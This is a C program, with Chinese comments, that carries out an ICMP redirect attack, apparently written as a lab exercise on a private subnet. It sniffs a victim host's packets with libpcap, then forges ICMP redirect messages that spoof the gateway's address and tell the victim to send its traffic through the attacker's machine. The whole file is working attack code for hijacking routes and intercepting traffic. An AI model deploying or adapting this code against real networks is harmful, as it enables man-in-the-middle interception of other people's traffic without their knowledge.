#include <pcap.h>
#include <time.h>
#include <stdlib.h>
#include <stdio.h>
#include <netinet/in.h>  
#include<sys/socket.h>
#include<unistd.h>


#define MAX 1024
#define SIZE_ETHERNET 14

const unsigned char *Vic_IP = "192.168.255.129";//攻击对象的ip
const unsigned char *Ori_Gw_IP = "192.168.255.2";//源网关ip
const unsigned char *Redic_IP = "192.168.255.128";//攻击者ip
int flag = 0;

/* IP header */
struct ip_header  
{  
#ifdef WORDS_BIGENDIAN  
  u_int8_t ip_version:4;  
  u_int8_t ip_header_length:4;  
#else  
  u_int8_t ip_header_length:4;  
  u_int8_t ip_version:4;  
#endif  
  u_int8_t ip_tos;  
  u_int16_t ip_length;  
  u_int16_t ip_id;  
  u_int16_t ip_off;  
  u_int8_t ip_ttl;  
  u_int8_t ip_protocol;  
  u_int16_t ip_checksum;  
  struct in_addr ip_source_address;  
  struct in_addr ip_destination_address;  
};  

//icmp 重定向报文头
struct icmp_header  
{  
  u_int8_t icmp_type;  
  u_int8_t icmp_code;  
  u_int16_t icmp_checksum;  
  struct in_addr icmp_gateway_addr;

  //u_int16_t icmp_identifier;  
  //u_int16_t icmp_sequence;  
};  


/*计算校验和*/  
u_int16_t checksum(u_int8_t *buf,int len)  
{  
    u_int32_t sum=0;  
    u_int16_t *cbuf;  
  
    cbuf=(u_int16_t *)buf;  
  
    while(len>1)
	{  
    	sum+=*cbuf++;  
    	len-=2;  
    }  
  
    if(len)  
        sum+=*(u_int8_t *)cbuf;  
  
        sum=(sum>>16)+(sum & 0xffff);  
        sum+=(sum>>16);  
  
        return ~sum;  
}  


void ping_redirect(int sockfd,const unsigned char *data,int datalen)
{ 
	char buf[MAX],*p;
	struct ip_header *ip;
	struct icmp_header *icmp;
	int len,i;
	struct sockaddr_in dest; 

	memset(buf,0,MAX);

	/*目标IP  这里为受害者ip*/
	dest.sin_family = AF_INET;
	dest.sin_addr.s_addr = inet_addr(Vic_IP);

    //手动填充ip头
	ip = (struct ip_header*)buf;
	ip->ip_version = 4;
	ip->ip_header_length = sizeof(struct ip_header)>>2;
	ip->ip_tos = 0;//服务类型
	ip->ip_length = sizeof(struct ip_header) + sizeof(struct icmp_header) + datalen;
	ip->ip_id = 0;
	ip->ip_off = 0;
	ip->ip_ttl = 255;
	ip->ip_protocol = IPPROTO_ICMP;
	ip->ip_source_address.s_addr = inet_addr(Ori_Gw_IP);//要伪造网关发送ip报文
	ip->ip_destination_address.s_addr = inet_addr(Vic_IP);//将伪造重定向包发给受害者
	

	//手动填充icmp头
	icmp = (struct icmp_header*)(buf+20);
	icmp->icmp_type = 5;//ICMP_REDIRECT
	icmp->icmp_code = 1;//重定向主机的数据报
	icmp->icmp_checksum = 0;
	icmp->icmp_gateway_addr.s_addr = inet_addr(Redic_IP);//告诉受害者 将网关ip改成redic_ip

	p = buf+28;
	for(i=0;i<datalen;++i)
	{
		p[i] = data[i];//拷贝抓来的ip头和数据部分前8字节
	}

	icmp->icmp_checksum = checksum((unsigned short *)icmp, 36);//8 + 20 + 8

	sendto(sockfd,buf,56,0,(struct sockaddr *)&dest,sizeof(dest));
	//printf("send\n");
}


void parseIPHeader(const u_char *ip_packet)
{
	const struct ip_header *ip;
	ip = (struct ip_header*)ip_packet;
	int ip_header_len = ip->ip_header_length*4;

	if(ip_header_len<20)
	{
		//printf("Invalid IP header len!\n");
		return;
	}

	printf("Src :%s\n",inet_ntoa(ip->ip_source_address));

	if(!strcmp(Vic_IP,inet_ntoa(ip->ip_source_address)))
	{
		//抓到被攻击者的数据包！
		//printf("find!\n");
		flag = 1;
		int count=0;
		while(1)
		{
			int sockfd,res;
			int one = 1;
    		int *ptr_one = &one;
			//printf("here!\n");
			if((sockfd = socket(AF_INET,SOCK_RAW,IPPROTO_ICMP))<0)
			{
				printf("create sockfd error\n");
				exit(-1);
			}
			res = setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL,ptr_one, sizeof(one));
    		if(res < 0)
       		{
				printf("error--\n");
				exit(-3);
			}

			ping_redirect(sockfd,ip_packet,28);//20字节ip头加上8字节上层协议,作为新发送icmp的数据部分
			if(count++<5)
				continue;
			break;
		}
		
	}

}


void getPacket(u_char * arg, const struct pcap_pkthdr * pkthdr, const u_char * packet)
{
	static int id = 0;
	const struct sniff_ethernet *ethernet;
	const struct ip_header *ip;


	printf("=============================\n");
	printf("id: %d\n", ++id);
	printf("Packet length: %d\n", pkthdr->len);
	//printf("Number of bytes: %d\n", pkthdr->caplen);
	//printf("Recieved time: %s", ctime((const time_t *)&pkthdr->ts.tv_sec)); 

	//接受到的是以太网帧
	ethernet = (struct sniff_ethernet*)packet;
	ip = (struct ip_header*)(packet + SIZE_ETHERNET);

	parseIPHeader(packet + SIZE_ETHERNET);

}


int main()
{
	char errBuf[PCAP_ERRBUF_SIZE], * devStr;

	/* get a device */
	devStr = pcap_lookupdev(errBuf);

	if(devStr)
	{
		printf("success: device: %s\n", devStr);
	}
	else
	{
		printf("error: %s\n", errBuf);
		exit(1);
	}

	/* open a device, wait until a packet arrives */
	pcap_t * device = pcap_open_live(devStr, 65535, 1, 0, errBuf);

	struct bpf_program filter;
	char filterstr[50]={0};
	sprintf(filterstr,"src host %s",Vic_IP);
	pcap_compile(device,&filter,filterstr,1,0);
	pcap_setfilter(device,&filter);

	/* wait loop forever */
	int id = 0;
	pcap_loop(device, -1, getPacket, NULL);
    
    
    return 0;
}
